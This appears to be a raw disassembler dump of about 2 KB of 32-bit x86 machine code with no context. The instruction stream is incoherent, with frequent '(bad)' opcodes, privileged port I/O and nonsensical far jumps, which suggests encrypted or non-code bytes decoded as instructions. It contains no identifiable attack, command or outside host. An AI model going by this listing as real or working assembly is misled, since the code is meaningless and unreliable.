  406233:	pop    es
  406234:	mov    ds:0xa5ff76b0,al
  406239:	scas   al,BYTE PTR es:[edi]
  40623a:	out    dx,al
  40623b:	sti    
  40623c:	popf   
  40623d:	xor    BYTE PTR [eax+ebp*8],cl
  406240:	or     eax,0xc3ff74aa
  406245:	fwait
  406246:	(bad)  
  406247:	jmp    FWORD PTR [esi]
  406249:	repz cmp di,0x69
  40624e:	add    esi,DWORD PTR [ecx+ebx*8+0x5]
  406252:	add    al,0x33
  406254:	mov    ebx,0xf675745d
  406259:	xchg   ebp,eax
  40625a:	cmc    
  40625b:	leave  
  40625c:	pop    ebp
  40625d:	not    dl
  40625f:	addr16 cli 
  406261:	pop    ebp
  406262:	fs mov esi,0x7ede6aa
  406268:	push   edx
  406269:	mov    ds:0xc53dff6b,eax
  40626e:	inc    edi
  40626f:	(bad)  
  406270:	xor    eax,0x10eabe
	...
  406285:	add    cl,ch
  406287:	pushf  
  406288:	add    edi,edi
  40628a:	scas   eax,DWORD PTR es:[edi]
  40628b:	popa   
  40628c:	imul   ebx,DWORD PTR [ebp+0x30],0x36
  406290:	je     0x4062e2
  406292:	mov    ds:0x4cef035c,al
  406297:	add    al,0xb9
  406299:	je     0x40622a
  40629b:	cld    
  40629c:	adc    BYTE PTR [edx+0x6b166f12],bl
  4062a2:	mov    al,ds:0x62740e47
  4062a7:	sub    DWORD PTR [edx+0x746fe5c2],edi
  4062ad:	pop    es
  4062ae:	shl    BYTE PTR [ecx],cl
  4062b0:	and    esi,DWORD PTR [ebp+edx*8-0x2b]
  4062b4:	add    BYTE PTR [ecx],0xfa
  4062b7:	pop    ebp
  4062b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062b9:	aam    0xc4
  4062bb:	clc    
  4062bc:	lock pop ebx
  4062be:	inc    edx
  4062bf:	pop    ebp
  4062c0:	(bad)  
  4062c1:	jae    0x406265
  4062c3:	jl     0x40626c
  4062c5:	jae    0x406274
  4062c7:	cmp    al,0xab
  4062c9:	cld    
  4062ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062cb:	fnstenv [ecx+0x60]
  4062ce:	popf   
  4062cf:	clc    
  4062d0:	in     al,0x5b
  4062d2:	ret    
  4062d3:	cmp    ebp,DWORD PTR [esi+0x1d450173]
  4062d9:	push   cs
  4062da:	adc    bh,BYTE PTR [eax-0x25]
  4062dd:	les    edi,FWORD PTR [ebp-0x42]
  4062e0:	adc    dl,0x43
  4062e3:	outs   dx,BYTE PTR ds:[esi]
  4062e4:	mov    ss,esp
  4062e6:	mov    ebp,0xfbfc6d
	...
  4062fb:	add    BYTE PTR [ebp-0x1f],bl
  4062fe:	jge    0x406373
  406300:	pop    ebp
  406301:	pop    ebp
  406302:	adc    eax,0xa06e554a
  406307:	inc    esi
  406308:	add    al,BYTE PTR ds:0x82567ebc
  40630e:	and    eax,0x5604d064
  406313:	stc    
  406314:	add    eax,0x2cffd46e
  406319:	cmp    BYTE PTR [esi],al
  40631b:	sbb    eax,0xdb5104bb
  406320:	xor    ch,BYTE PTR [esi+0x0]
  406323:	ss xchg edi,eax
  406325:	(bad)  
  406326:	repz ret 
  406328:	stc    
  406329:	ins    DWORD PTR es:[edi],dx
  40632a:	jne    0x406329
  40632c:	mov    bh,dh
  40632e:	or     ebx,DWORD PTR [esi]
  406330:	ret    
  406331:	sub    eax,0x5cf9a829
  406336:	inc    ecx
  406337:	and    BYTE PTR [ecx+0x6e],ch
  40633a:	mov    DWORD PTR [ebp+edx*2-0x1d020025],ebp
  406341:	adc    eax,0x6ed57cff
  406346:	xor    eax,0xffc3eeae
  40634b:	shl    ah,1
  40634d:	cmp    edi,edi
  40634f:	fidivr WORD PTR [esi]
  406351:	enter  0x64f7,0xc2
  406355:	gs push eax
  406357:	into   
  406358:	mov    dl,0x9
  40635a:	(bad)  
  40635b:	cmp    al,0xfa
  40635d:	ins    DWORD PTR es:[edi],dx
  40635e:	xor    eax,0xfe
	...
  40636f:	add    BYTE PTR [eax],al
  406371:	add    dh,bh
  406373:	ret    
  406374:	inc    eax
  406376:	in     al,dx
  406377:	cmp    edi,edi
  406379:	scas   al,BYTE PTR es:[edi]
  40637a:	push   cs
  40637b:	enter  0x13ef,0xfe
  40637f:	ins    DWORD PTR es:[edi],dx
  406380:	jne    0x40634b
  406382:	or     al,bh
  406384:	or     edx,DWORD PTR [esi+0x28292e32]
  40638a:	neg    BYTE PTR [ebp+edi*8-0x4f]
  40638e:	call   0xda64ed00
  406393:	jg     0x4063da
  406395:	mov    DWORD PTR [ecx],ebp
  406397:	outs   dx,BYTE PTR ds:[esi]
  406398:	jne    0x40635f
  40639a:	enter  0xbf7,0x66
  40639e:	add    ch,BYTE PTR [esi]
  4063a0:	sub    DWORD PTR [eax+0x21e55cf9],ebp
  4063a6:	test   al,0x6d
  4063a8:	mov    DWORD PTR [ebp+edx*4-0x40ff827f],esp
  4063af:	add    DWORD PTR [edi],ecx
  4063b1:	test   bh,al
  4063b3:	add    DWORD PTR [eax],eax
  4063b5:	add    BYTE PTR [eax+0x2c00f774],ah
  4063bb:	test   DWORD PTR [edx-0x7cfeed00],ecx
  4063c1:	jge    0x4063aa
  4063c3:	add    DWORD PTR [edi],ecx
  4063c5:	test   BYTE PTR [ebx+0x8],ah
  4063c8:	add    BYTE PTR [eax],al
  4063ca:	cld    
  4063cb:	ins    BYTE PTR es:[edi],dx
  4063cc:	daa    
  4063cd:	jmp    DWORD PTR [esi+0x70]
  4063d0:	out    0x2a,eax
  4063d2:	adc    edi,esi
  4063d4:	(bad)  
  4063d5:	inc    DWORD PTR [eax]
	...
  4063e7:	add    BYTE PTR [esi-0x24],dl
  4063ea:	(bad)  
  4063eb:	jne    0x4063c8
  4063ed:	rol    BYTE PTR [eax-0x109233e],1
  4063f3:	jne    0x4063d0
  4063f5:	div    BYTE PTR [eax+ecx*1-0x45]
  4063f9:	outs   dx,DWORD PTR ds:[esi]
  4063fa:	sar    edi,0xbc
  4063fd:	div    BYTE PTR [esp+esi*8-0x44]
  406401:	je     0x40640a
  406403:	call   0x3f2750
  406408:	and    bl,BYTE PTR [edi+eiz*1+0x13]
  40640c:	mov    ds:0x8e75bde5,eax
  406411:	cmc    
  406412:	je     0x406404
  406414:	pop    esp
  406415:	je     0x40641e
  406417:	call   0x3f2750
  40641c:	js     0x406425
  40641e:	push   DWORD PTR [ebp-0x75]
  406421:	div    BYTE PTR [eax+esi*8-0x24]
  406425:	jae    0x40642e
  406427:	call   0x3f2654
  40642c:	fdiv   QWORD PTR [ebx-0x15]
  40642f:	jmp    DWORD PTR [esi]
  406431:	jo     0x40641a
  406433:	cmp    al,0x11
  406435:	idiv   dh
  406437:	cmp    edx,0x50
  40643a:	add    BYTE PTR [bp-0x7b90],ah
  40643f:	jge    0x40645b
  406441:	pop    edx
  406442:	test   BYTE PTR [esi],0x71
  406445:	mov    eax,ds:0x32caff67
  40644a:	test   DWORD PTR [edi],0x0
	...
  40645c:	add    BYTE PTR [eax],al
  40645e:	and    bl,BYTE PTR ds:0x1705ff43
  406464:	(bad)  
  406465:	imul   edi,edx,0xe207f70a
  40646b:	enter  0xff42,0xed
  40646f:	cli    
  406470:	div    bl
  406472:	sar    BYTE PTR [ecx],cl
  406474:	inc    esi
  406475:	(bad)  
  406476:	(bad)  [edx-0xa]
  406479:	sti    
  40647a:	loop   0x4064cd
  40647c:	inc    esi
  40647d:	dec    ebp
  40647f:	pop    edx
  406480:	div    bh
  406482:	shr    BYTE PTR [ecx+0x46],cl
  406485:	(bad)  
  406486:	mov    ebp,0xa2eff64a
  40648b:	popa   
  40648c:	inc    esi
  40648d:	jmp    FWORD PTR [ebp-0x6d1409c6]
  406493:	pop    ecx
  406494:	inc    esi
  406495:	call   FWORD PTR [ebp-0x5d1c0956]
  40649b:	mov    cl,0x47
  40649d:	dec    DWORD PTR [ebp-0x5dbba5c]
  4064a3:	sub    BYTE PTR [ebp-0x14],bh
  4064a6:	jnp    0x406449
  4064a8:	jae    0x4064a1
  4064aa:	jne    0x40643e
  4064ac:	fist   DWORD PTR [edx]
  4064ae:	cli    
  4064af:	jmp    0xffc2:0xae7168b0
  4064b6:	aad    0xdd
  4064b8:	xor    eax,DWORD PTR [ecx-0x6]
  4064bb:	add    eax,0x5dbb32ed
  4064c0:	(bad)  [eax+0x0]
	...
  4064d3:	add    BYTE PTR [ecx],cl
  4064d5:	add    eax,0xd8d203a8
  4064da:	sbb    ebx,eax
  4064dc:	xor    eax,0xbb34dee3
  4064e1:	add    al,0x4e
  4064e3:	div    cl
  4064e5:	imul   edi,DWORD PTR [ebx+edi*8+0x703edd15],0x15
  4064ed:	(bad)  
  4064ef:	add    ebx,DWORD PTR ds:0xc93fc1aa
  4064f5:	(bad)
  4064f8:	xor    al,0x37
  4064fa:	test   al,0x3
  4064fc:	bound  ebp,QWORD PTR [esi-0x1d123d26]
  406502:	dec    ecx
  406503:	xor    al,0x3b
  406505:	add    eax,0xc4299891
  40650a:	call   0xa87709ea
  40650f:	add    ecx,ebp
  406511:	lock fdiv QWORD PTR [eax+0x4f]
  406515:	std    
  406516:	shr    BYTE PTR [ebx],1
  406518:	mov    esp,0x9dcde6a
  40651d:	add    eax,0x1922aec6
  406522:	adc    eax,0xe1e2a5c5
  406527:	aaa    
  406528:	cmp    eax,DWORD PTR ds:0xc3c9fa51
  40652e:	call   0x2876fb0e
  406533:	add    al,0x12
  406535:	push   edx
  406536:	fcmovb st,st(4)
	...
  406548:	add    BYTE PTR [eax],al
  40654a:	jge    0x40652e
  40654c:	lahf   
  40654d:	xor    edi,DWORD PTR [ebx+0x1f99604]
  406553:	push   0x14
  406555:	cld    
  406556:	pop    ebp
  406557:	clc    
  406558:	xchg   BYTE PTR [edi+0x5d],ch
  40655b:	js     0x406581
  40655d:	jo     0x406509
  40655f:	imul   eax,DWORD PTR [eax],0x356b4dfc
  406565:	scas   al,BYTE PTR es:[edi]
  406566:	out    0xc3,al
  406568:	call   DWORD PTR [eax-0x77]
  40656b:	xchg   ebx,eax
  40656c:	add    cl,ch
  40656e:	xor    BYTE PTR [edx-0x404b2c8b],ch
  406574:	imul   ecx
  406576:	stc    
  406577:	add    al,0x0
  406579:	xor    esi,DWORD PTR cs:[esi-0x1]
  40657d:	out    0xf9,al
  40657f:	add    al,0x6a
  406581:	jmp    0xe9a9cfb9
  406586:	and    ebp,DWORD PTR [edx-0x74]
  406589:	lods   al,BYTE PTR ds:[esi]
  40658a:	test   esp,edx
  40658c:	mov    WORD PTR [edx+esi*2+0x72],fs
  406590:	call   DWORD PTR [esi]
  406592:	(bad)  
  406593:	push   0x75
  406595:	adc    DWORD PTR [ebp-0x10],edx
  406598:	sti    
  406599:	adc    DWORD PTR [edi-0x6d],ebx
  40659c:	add    cl,ch
  40659e:	shr    BYTE PTR [ecx-0x3acf148c],1
  4065a4:	addr16 cmp esi,esp
  4065a7:	ret    
  4065a8:	jmp    ebp
  4065aa:	ret    0xe7fd
  4065ad:	mov    es,WORD PTR [eax]
	...
  4065bf:	add    BYTE PTR [edx+ebp*2],bh
  4065c2:	jmp    DWORD PTR [edx+0x49]
  4065c5:	js     0x40654c
  4065c7:	aad    0x2c
  4065c9:	push   0xffffffff
  4065cb:	sbb    eax,ecx
  4065cd:	popa   
  4065ce:	hlt    
  4065cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d0:	and    al,0x6a
  4065d2:	mov    DWORD PTR [ecx+ecx*1+0x72],ebp
  4065d6:	jmp    FWORD PTR [esi-0x610f4fec]
  4065dc:	or     al,0x6a
  4065de:	call   DWORD PTR [esi+esi*2]
  4065e1:	popa   
  4065e2:	cmc    
  4065e3:	xchg   edi,eax
  4065e4:	fsubr  QWORD PTR [ecx-0x1]
  4065e7:	push   esp
  4065e8:	jmp    0x7441655e
  4065ed:	int    0xe1
  4065ef:	ret    
  4065f0:	aam    0xda
  4065f2:	inc    BYTE PTR [ebp-0x35]
  4065f5:	into   
  4065f6:	xchg   esp,eax
  4065f7:	dec    DWORD PTR [esi-0x27]
  4065fa:	out    0x2f,eax
  4065fc:	mov    ebp,0xe1c90005
  406601:	ins    DWORD PTR es:[edi],dx
  406602:	call   DWORD PTR [eax+ebx*4-0x37]
  406606:	add    ah,0xb7
  406609:	dec    ebx
  40660a:	jmp    FWORD PTR [ecx+0xd]
  40660d:	fidiv  DWORD PTR [eax+ecx*1-0x55]
  406611:	repnz mov edi,0x44e8c4ff
  406617:	cld    
  406618:	cmp    esi,DWORD PTR [esi]
  40661a:	xor    eax,DWORD PTR [ecx+0x13]
  40661d:	fidiv  DWORD PTR [eax+ecx*1+0xb]
  406621:	scas   eax,DWORD PTR es:[edi]
  406622:	(bad)  
  406623:	inc    DWORD PTR [eax]
	...
  406635:	add    BYTE PTR [esi+ecx*2],al
  406638:	jmp    DWORD PTR [edi+0x73]
  40663b:	xor    eax,DWORD PTR [ecx+0x0]
  40663e:	mov    esi,DWORD PTR [ebx]
  406640:	xor    eax,DWORD PTR [ecx-0x1d]
  406643:	xlat   BYTE PTR ds:[ebx]
  406644:	xor    al,0x3f
  406646:	mov    edx,0x3e7ff41
  40664b:	ret    0xfffe
  40664e:	enter  0x73c4,0xf
  406652:	repz push eax
  406654:	(bad)  
  406655:	jne    0x4065f2
  406657:	int3   
  406658:	xchg   esp,eax
  406659:	cld    
  40665a:	mov    ah,0xda
  40665c:	out    0x85,eax
  40665e:	push   eax
  40665f:	(bad)  
  406661:	push   0xffffffa3
  406663:	dec    esp
  406664:	mov    cl,0x28
  406666:	loop   0x406668
  406668:	push   0xff438046
  40666d:	(bad)  
  40666e:	sahf   
  40666f:	sbb    DWORD PTR [ecx],ebp
  406671:	inc    ecx
  406672:	arpl   sp,cx
  406674:	test   esi,eax
  406676:	cli    
  406677:	mov    gs,WORD PTR [ebp+0xb]
  40667a:	cmp    dl,BYTE PTR [edx]
  40667c:	std    
  40667d:	dec    edi
  40667e:	retf   0xf77e
  406681:	pop    es
  406682:	bound  edx,QWORD PTR [ebx]
  406684:	jo     0x406685
  406686:	dec    ebp
  406687:	xchg   cl,cl
  406689:	ret    0xd745
  40668c:	fcos   
  40668e:	aad    0x3d
  406690:	xor    BYTE PTR [ecx-0x6],al
  406693:	push   ebp
  406694:	xor    BYTE PTR [ebx],dh
  406696:	mov    ebx,0x1db5d
	...
  4066ab:	add    dl,bh
  4066ad:	pop    ebp
  4066ae:	sub    eax,0xffffffbf
  4066b1:	pop    ss
  4066b2:	ins    DWORD PTR es:[edi],dx
  4066b3:	inc    DWORD PTR [ecx]
  4066b5:	push   ds
  4066b6:	clc    
  4066b7:	push   cs
  4066b8:	stos   BYTE PTR es:[edi],al
  4066b9:	lea    ebp,[ebp+esi*2-0xe]
  4066bd:	vpsubq xmm7,xmm7,xmm5
  4066c1:	push   ds
  4066c2:	pop    esp
  4066c3:	xor    bh,BYTE PTR [ecx-0x59592fa]
  4066c9:	test   DWORD PTR [ecx-0x24a1c4d8],esi
  4066cf:	inc    ebp
  4066d0:	sub    DWORD PTR [ebp+0x5df86803],ebx
  4066d6:	add    eax,DWORD PTR [eax-0xba561e]
  4066dc:	lds    esp,FWORD PTR [edx+0x43]
  4066df:	je     0x4066ce
  4066e1:	sub    eax,0x762ffed4
  4066e6:	pop    ebx
  4066e7:	sbb    DWORD PTR [esi-0xc1793b2],ebp
  4066ed:	call   0x756c:0x6410ff6c
  4066f4:	add    dl,BYTE PTR [esi-0x17]
  4066f7:	sti    
  4066f8:	lea    ebp,[esi+0x308522d9]
  4066fe:	cld    
  4066ff:	out    0xa,eax
  406701:	add    eax,0xda756ca5
  406706:	cld    
  406707:	ins    BYTE PTR es:[edi],dx
  406708:	out    0xfc,eax
  40670a:	and    ch,0x61
  40670d:	mov    gs,WORD PTR [si+0x0]
	...
  406721:	add    bh,ah
  406723:	push   0x5cfdf686
  406728:	pop    ds
  406729:	inc    esp
  40672a:	dec    ebp
  40672b:	addr16 mov al,ds:0xfe41
  40672f:	add    al,0x14
  406731:	jns    0x406781
  406733:	sub    DWORD PTR ds:0xd2cfcc6f,0x3
  40673a:	mov    al,ds:0xfdf655ff
  40673f:	pop    esp
  406740:	jmp    0x70a78488
  406745:	(bad)  
  406746:	adc    DWORD PTR [ebx-0xc],edi
  406749:	retf   
  40674a:	aad    0xc5
  40674c:	call   0x1092ec9
  406751:	ret    
  406752:	std    
  406753:	out    0xe5,al
  406755:	add    ebp,DWORD PTR [esi-0xe]
  406758:	nop
  406759:	cs es (bad) 
  40675c:	call   0x74014535
  406761:	add    edi,edx
  406763:	stc    
  406764:	sub    bh,dh
  406766:	hlt    
  406767:	into   
  406768:	adc    bl,bl
  40676a:	shl    DWORD PTR [esi-0xa],0xd2
  40676e:	pop    ebp
  40676f:	add    eax,0xdd7c5ce9
  406774:	aas    
  406775:	xor    BYTE PTR [ebx],bh
  406777:	add    eax,0xfd276b39
  40677c:	ror    dh,0x9c
  40677f:	data16 into 
  406781:	pop    esp
  406782:	je     0x4067c7
  406784:	(bad)  
  406785:	imul   eax,DWORD PTR [eax],0x0
	...
  406798:	and    bh,BYTE PTR [edx-0x30723b0c]
  40679e:	inc    eax
  4067a0:	jmp    0x7d296834
  4067a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067a6:	je     0x4067ae
  4067a8:	dec    eax
  4067a9:	pop    esi
  4067aa:	cmp    ch,BYTE PTR [ebp+0x15065e1]
  4067b0:	inc    BYTE PTR [edi+ebp*8]
  4067b3:	dec    edi
  4067b4:	ds int 0x33
  4067b7:	sub    dh,bh
  4067b9:	aam    0xfe
  4067bb:	hlt    
  4067bc:	push   ecx
  4067bd:	pop    esi
  4067be:	sub    al,0x8e
  4067c0:	shl    DWORD PTR [ebp-0x18],1
  4067c3:	adc    DWORD PTR [ebp+eiz*2-0x4100ad01],esi
  4067ca:	jg     0x4067eb
  4067cc:	imul   bh
  4067ce:	stc    
  4067cf:	scas   eax,DWORD PTR es:[edi]
  4067d0:	popf   
  4067d1:	xor    eax,eax
  4067d3:	nop
  4067d4:	xchg   ecx,eax
  4067d5:	inc    DWORD PTR gs:[esi-0x74]
  4067d9:	xchg   esi,eax
  4067da:	cmp    dh,ah
  4067dc:	or     bh,BYTE PTR [ecx-0x1]
  4067df:	mov    esp,0xe175659d
  4067e4:	mov    eax,ds:0x6126bfb0
  4067e9:	(bad)  
  4067ea:	pop    ebp
  4067eb:	xor    BYTE PTR [ecx+eax*1],dh
  4067ee:	add    BYTE PTR [esp+eiz*2-0x61697a7],bh
  4067f5:	push   ebp
  4067f6:	mov    esi,0x4131e491
  4067fb:	jmp    0x406800
	...
  40680c:	add    BYTE PTR [eax],al
  40680e:	pusha  
  40680f:	lock or esi,esi
  406812:	retf   0xe7fd
  406815:	push   es
  406816:	pop    eax
  406817:	call   WORD PTR [ecx-0x1]
  40681b:	add    al,0xef
  40681d:	lahf   
  40681e:	shl    ebp,1
  406820:	xor    ebp,DWORD PTR [eax]
  406822:	(bad)  
  406823:	gs jne 0x406803
  406826:	adc    al,dh
  406828:	pop    es
  406829:	add    BYTE PTR [ebx+0x4cffe5cf],ch
  40682f:	sub    dl,al
  406831:	or     BYTE PTR [ebx+0x4cec8a54],dl
  406837:	je     0x406844
  406839:	call   0x3f2b5e
  40683e:	push   0xfb1a73c1
  406843:	arpl   WORD PTR [ebx],si
  406845:	inc    ecx
  406846:	push   ebx
  406847:	push   ecx
  406848:	out    0xd8,eax
  40684a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40684b:	(bad)  
  40684d:	push   eax
  40684e:	repz fnstenv [eax+ecx*1+0x7b]
  406853:	xchg   bh,bh
  406855:	dec    esp
  406857:	leave  
  406858:	aad    0xc1
  40685a:	pushf  
  40685b:	fcmove st,st(0)
  40685d:	ret    0x12b
  406860:	push   ebp
  406861:	mov    edi,DWORD PTR [edi+0x39fcc47e]
  406867:	add    DWORD PTR [edx+0x8],ebp
  40686a:	mov    esp,0xbbe80774
  40686f:	fwait
  406870:	(bad)  
  406871:	inc    DWORD PTR [eax]
	...
  406883:	add    BYTE PTR [edx+0x136afb44],bl
  406889:	dec    ecx
  40688a:	push   edi
  40688b:	xor    eax,0x856808a2
  406890:	(bad)  
  406891:	dec    ecx
  406892:	(bad)  
  406893:	inc    dh
  406895:	das    
  406896:	sub    DWORD PTR [ecx-0x2d],eax
  406899:	sar    BYTE PTR [ebp+0xaeefcc4],0xc0
  4068a0:	inc    edi
  4068a1:	adc    al,0x50
  4068a3:	push   0xbeef08d2
  4068a8:	arpl   di,bp
  4068aa:	je     0x4068b4
  4068ac:	retf   
  4068ad:	ins    BYTE PTR es:[edi],dx
  4068ae:	loop   0x4068af
  4068b0:	int3   
  4068b1:	ror    DWORD PTR [ebp+0x693afac1],0x6a
  4068b8:	cli    
  4068b9:	(bad)
  4068bc:	cmp    ebp,DWORD PTR [esi-0x25]
  4068bf:	test   eax,0xff042cc6
  4068c4:	iret   
  4068c5:	pop    edx
  4068c6:	sbb    al,BYTE PTR [ecx-0x6]
  4068c9:	inc    ebp
  4068ca:	jns    0x406890
  4068cc:	jne    0x406879
  4068ce:	std    
  4068cf:	mov    edi,0x67d359e6
  4068d4:	sti    
  4068d5:	ins    DWORD PTR es:[edi],dx
  4068d6:	pop    eax
  4068d7:	mov    esi,0x7ef92ca
  4068dc:	bound  ebx,QWORD PTR [eiz*2-0x3689b201]
  4068e3:	rol    BYTE PTR [ebp-0x25],0xdd
  4068e7:	inc    DWORD PTR [eax]
	...
  4068f9:	add    ch,dl
  4068fb:	add    eax,0x35fa412f
  406900:	pop    edi
  406901:	xor    al,0xbb
  406903:	ins    DWORD PTR es:[edi],dx
  406904:	push   0xc304e535
  406909:	call   DWORD PTR ds:0x15ff3f4e
  40690f:	push   edi
  406910:	inc    ebx
  406911:	je     0x406910
  406913:	jge    0x4068e8
  406915:	dec    BYTE PTR [edi-0x2f5a49b]
  40691b:	xor    ch,BYTE PTR [ecx-0x18]
  40691e:	das    
  40691f:	sub    eax,0x6e60ff69
  406924:	(bad)  [edi+0x2f]
  406927:	lods   eax,DWORD PTR ds:[esi]
  406928:	add    ebp,DWORD PTR [eax-0x12]
  40692b:	cmp    dl,al
  40692d:	call   esp
  40692f:	mov    al,ds:0x6e3b2928
  406934:	pop    ebx
  406935:	ss mov esi,0xba0b685a
  40693b:	fincstp 
  40693d:	dec    edi
  40693e:	dec    edx
  40693f:	add    eax,0x6cf5eee6
  406944:	leave  
  406945:	imul   esp,DWORD PTR [ebp-0x45033e9d],0x95ddce63
  40694f:	jmp    0x406988
  406951:	das    
  406952:	cmp    eax,DWORD PTR ds:0xc5cebb51
  406958:	call   0x6430c5
  40695d:	ret    
	...
  40696e:	add    BYTE PTR [eax],al
  406970:	jne    0x4069dd
  406972:	cmc    
  406973:	aas    
  406974:	ins    DWORD PTR es:[edi],dx
  406975:	arpl   dx,si
  406977:	inc    ebx
  406978:	out    dx,al
  406979:	adc    edi,DWORD PTR [ecx]
  40697b:	aam    0x5c
  40697d:	fchs   
  40697f:	pop    ebx
  406980:	mov    WORD PTR [edx-0x7a],fs
  406983:	push   0x68a96562
  406988:	inc    ebp
  406989:	out    dx,al
  40698a:	aam    0x68
  40698c:	(bad)  
  40698d:	or     al,0x81
  40698f:	dec    ebx
  406990:	xor    al,0x63
  406992:	data16 fst QWORD PTR [ebx]
  406995:	fs aam 0xfb
  406998:	sbb    eax,0x1d685752
  40699d:	out    dx,al
  40699e:	or     DWORD PTR [ecx-0x71],ebp
  4069a1:	or     al,0x51
  4069a3:	aas    
  4069a4:	or     al,0x63
  4069a6:	ds push 0xee36608f
  4069ac:	cmc    
  4069ad:	ins    BYTE PTR es:[edi],dx
  4069ae:	imul   DWORD PTR [ecx+0x453062f5]
  4069b4:	test   BYTE PTR [esp+esi*4],0x7c
  4069b8:	(bad)  
  4069b9:	bound  ebx,QWORD PTR [edi+esi*8+0x68255dd5]
  4069c0:	aad    0xe
  4069c2:	sub    edi,ebp
  4069c4:	aas    
  4069c5:	in     eax,dx
  4069c6:	push   0x2e
  4069c8:	cmp    eax,DWORD PTR ds:0x90219900
  4069ce:	(bad)  
  4069cf:	out    dx,al
  4069d0:	sbb    eax,0x394fb5
	...
  4069e5:	add    dh,cl
  4069e7:	(bad)  
  4069e8:	dec    esi
  4069ea:	pop    esp
  4069eb:	in     eax,dx
  4069ec:	jl     0x406a0a
  4069ee:	mov    bh,0x62
  4069f0:	dec    edi
  4069f1:	into   
  4069f2:	mov    ecx,DWORD PTR [edx]
  4069f4:	call   0xffa28513
  4069f9:	and    DWORD PTR [esi+0x54c60005],esp
  4069ff:	in     eax,dx
  406a00:	mov    esi,esp
  406a02:	bound  ecx,QWORD PTR ds:[edi-0x5a]
  406a06:	imul   ecx,DWORD PTR [edx],0xffffffe8
  406a09:	(bad)  
  406a0b:	popa   
  406a0c:	push   DWORD PTR [ecx]
  406a0e:	ds add al,0x0
  406a11:	jle    0x4069af
  406a13:	in     eax,dx
  406a14:	cdq    
  406a15:	mov    esp,0x7e4f6236
  406a1a:	dec    ebx
  406a1b:	or     ch,al
  406a1d:	ret    0x61da
  406a20:	inc    DWORD PTR [ecx+0x66ffa245]
  406a26:	out    dx,eax
  406a27:	inc    esi
  406a28:	or     cl,ch
  406a2a:	dec    edx
  406a2b:	(bad)  
  406a2c:	in     al,dx
  406a2d:	push   0xffffffba
  406a2f:	pusha  
  406a30:	push   0xffffffe9
  406a32:	xor    ecx,DWORD PTR ds:0x6a11bcff
  406a38:	jns    0x406ab6
  406a3a:	popf   
  406a3b:	popa   
  406a3c:	mov    DWORD PTR [ebp+edx*4-0x14d1e612],ebp
  406a43:	or     eax,ebp
  406a45:	imul   edx,DWORD PTR [ebp+0x62],0x93ff
	...
  406a5c:	sbb    BYTE PTR [edx+0x75],ah
  406a5f:	loope  0x406aa2
  406a61:	(bad)  
  406a63:	push   cs
  406a64:	pop    ebp
  406a65:	out    dx,eax
  406a66:	sbb    eax,DWORD PTR [eax]
  406a68:	hlt    
  406a69:	push   ebx
  406a6a:	pop    es
  406a6b:	call   0x3f54e7
  406a70:	les    edx,FWORD PTR [ebx+edi*8-0x1]
  406a74:	cs pop esi
  406a76:	out    0x93,eax
  406a78:	push   esi
  406a79:	jmp    0x54ff:0x6151c9fe
  406a80:	sbb    BYTE PTR [edx-0x2dc4ff97],bh
  406a86:	xor    al,0x41
  406a88:	mov    ds:0xd235c43d,eax
  406a8d:	or     bh,bh
  406a8f:	xor    eax,0x410084
  406a94:	cmp    ebx,DWORD PTR [edx-0x3e]
  406a97:	call   DWORD PTR [esi+ebx*2+0x356e74bf]
  406a9e:	(bad)  
  406a9f:	jne    0x406b04
  406aa1:	jmp    0x874:0xea130c74
  406aa8:	imul   edx,DWORD PTR [ebx-0x423b001c],0xffffffdd
  406aaf:	mov    edi,0x69eac4
  406ab4:	sti    
  406ab5:	shl    DWORD PTR [ecx+eax*2],1
  406ab8:	and    edi,DWORD PTR ds:0x55235c4
  406abe:	push   0x2
	...
  406acf:	add    BYTE PTR [eax],al
  406ad1:	add    BYTE PTR [ebx],dl
  406ad3:	add    eax,0xc3c3e880
  406ad8:	(bad)  
  406ad9:	dec    DWORD PTR [eax]
  406adb:	lds    esi,FWORD PTR [ebx+0x15]
  406ade:	arpl   dx,bp
  406ae0:	je     0x406af2
  406ae2:	les    edx,FWORD PTR [ebx+ecx*1+0x50]
  406ae6:	and    al,0x55
  406ae8:	pop    es
  406ae9:	call   0x3f2b4e
  406aee:	or     esi,DWORD PTR [edi-0x41]
  406af1:	(bad)  
  406af2:	cli    
  406af3:	mul    BYTE PTR [ebp+0x75]
  406af6:	jmp    0x2fc3:0x620bf00e
  406afd:	inc    ecx
  406afe:	cli    
  406aff:	pop    esi
  406b00:	out    dx,eax
  406b01:	pop    es
  406b02:	shl    BYTE PTR [eax],cl
  406b04:	pop    edi
  406b05:	push   DWORD PTR [ebp-0x5f3bedb]
  406b0b:	and    BYTE PTR [ecx-0x14],bh
  406b0e:	jns    0x406aba
  406b10:	push   0xf9c3fa6a
  406b15:	dec    BYTE PTR [edi]
  406b17:	pop    bx
  406b19:	mov    esi,0x8965474e
  406b1e:	aas    
  406b1f:	mov    ds:0x477dffdc,al
  406b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b25:	push   0xffc2599c
  406b2a:	ins    BYTE PTR es:[edi],dx
  406b2b:	add    esp,edi
  406b2d:	out    0xda,eax
  406b2f:	jle    0x406b96
  406b31:	call   edx
  406b33:	ins    BYTE PTR es:[edi],dx
  406b34:	add    ebp,edi
	...
  406b46:	add    BYTE PTR [eax],al
  406b48:	xchg   esp,eax
  406b49:	push   es
  406b4a:	mov    bl,0x35
  406b4c:	mov    ebx,0xf275646d
  406b51:	jne    0x406b09
  406b53:	(bad)  
  406b54:	cmp    eax,0x367564d7
  406b59:	out    dx,eax
  406b5a:	out    dx,al
  406b5b:	pop    es
  406b5c:	and    bl,BYTE PTR [eax+ebp*4]
  406b5f:	jmp    DWORD PTR ds:0xfa044215
  406b65:	mov    al,ds:0x2a7bec78
  406b6a:	dec    esp
  406b6b:	test   DWORD PTR ds:0x64576c7,0xee75647e
  406b75:	push   ss
  406b76:	das    
  406b77:	aas    
  406b78:	and    ebp,DWORD PTR [ebp+0x487e803]
  406b7e:	js     0x406b84
  406b80:	cli    
  406b81:	or     ebp,DWORD PTR [ecx]
  406b83:	cmc    
  406b84:	jbe    0x406bc2
  406b86:	call   0xa488658e
  406b8b:	imul   edi,edx,0x4
  406b8e:	jmp    0xf50a2896
  406b93:	fs cmc 
  406b95:	add    al,0xe9
  406b97:	fnstenv [ebp-0x52261713]
  406b9d:	in     eax,dx
